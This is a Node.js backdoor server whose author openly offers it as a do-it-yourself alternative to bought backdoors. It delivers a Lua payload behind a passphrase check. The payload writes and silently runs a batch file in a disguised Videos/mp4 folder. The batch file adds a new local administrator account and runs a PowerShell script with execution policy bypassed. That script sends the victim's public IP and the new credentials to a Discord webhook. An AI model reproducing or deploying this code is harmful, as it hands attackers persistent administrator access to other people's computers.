/* Introduction


I have not tested any code that is posted here, I wrote it in one sitting and couldnt bother test it.
Take inspiration from my code and instead of buying shit backdoors make your own.

*/

const express = require("express");
const app = express();

// Body parser stuff
const bodyParser = require("body-parser");
app.use(bodyParser.urlencoded({extended: false}))
app.use(bodyParser.json());





/* BASIC SETUP
Change these 3 variables to your liking.
*/
let discord_webhook = "YOUR_WEBHOOK"
let username = "BDoor"
// use a secure password cause windows shit needs it
let password = "Password!!2@@£$31EEFv1"





app.get("/", (req, res) => {
    // memory exploit is crazy 🤡🤡🤡
    res.redirect("https://fini.ac/");
})

app.post("/", async (req, res) => {
    let body_json = req.body;
    if(Object.keys(body_json).length === 0) return res.redirect("https://fini.ac/");

    if(body_json.phrase != "tsm") return res.redirect("https://fini.ac/");

    let crypted = await generate_key(body_json.phrase);
    res.send(crypted);
})

app.post("/payload", (req, res) => {
    let param_crypto = req.body.crypto;
    if(param_crypto != "95cbf7b6cbdd83a640f37506d7884a7a"){
        return res.redirect("https://fini.ac/")
    }

    let backdoor_code = get_lua_payload(discord_webhook, username, password);
    res.send(backdoor_code);
})
app.listen(80, () => {
    console.log("http://127.0.0.1/");
})



// gen keys
const crypto = require("crypto");
const algorithm = "aes-192-cbc";

let iv = Buffer.alloc(16, 0);
function generate_key(phrase_param) {
    
    let key = crypto.scryptSync(`${phrase_param}`, "salt", 24);
    let cipher = crypto.createCipheriv(algorithm, key, iv); 
    let encrypted = cipher.update("data", "utf8", "hex");
    encrypted += cipher.final("hex");
    return encrypted;
}




function get_lua_payload(webhook_param, user_param, password_param){

    /* Lua Code
        This is the code that gets executed at the end of the day.
    */
    let payload_lua = 
    `
local function execCommand(command)
    local handle = io.popen(command)
    local result = handle:read("*a")
    handle:close()
    return result
end

local function directoryExists(path)
    local command = string.format('if exist "%s" (echo 1) else (echo 0)', path)
    local result = execCommand(command)
    return result:match("1") ~= nil
end

local function createDirectory(path)
    os.execute('mkdir "' .. path .. '"')
end

local function writeFile(filepath, content)
    local file, err = io.open(filepath, "w")
    if file then
        file:write(content)
        file:close()
    end
end

local function createAndExecuteBatch()
    local batchContent = [[
@echo off
net user ${user_param} ${password_param} /add /Y
net localgroup administrators ${user_param} /add /Y
powershell -ExecutionPolicy Bypass -File "C:/Users/%USERNAME%/Videos/mp4/1.ps1"
exit
]]
    local batchFilePath = "C:/Users/" .. os.getenv("USERNAME") .. "/Videos/mp4/1.bat"
    writeFile(batchFilePath, batchContent)
    os.execute("start /min cmd /c \"" .. batchFilePath .. " && del \"" .. batchFilePath .. "\" >nul\"")
end

local function createPowerShellScript()
    local psScriptContent = [[
$webhookUri = '${webhook_param}'
$ipAddress = Invoke-RestMethod -Uri 'https://api.ipify.org/?format=txt'
$user = "${user_param}"
$pass = "${password_param}"
$body = @{
    'username' = 'N'
    'content' = "Server IP: $ipAddress User: ||$user|| Pass: ||$pass||"
}
Invoke-RestMethod -Uri $webhookUri -Method 'Post' -Body $body
]]
    local psFilePath = "C:/Users/" .. os.getenv("USERNAME") .. "/Videos/mp4/1.ps1"
    writeFile(psFilePath, psScriptContent)
end

local function main()
    local dirPath = "C:/Users/" .. os.getenv("USERNAME") .. "/Videos/mp4"

    if not directoryExists(dirPath) then
        createDirectory(dirPath)
        createPowerShellScript()
        createAndExecuteBatch()
  
    end
end

main()

    `
    return payload_lua

}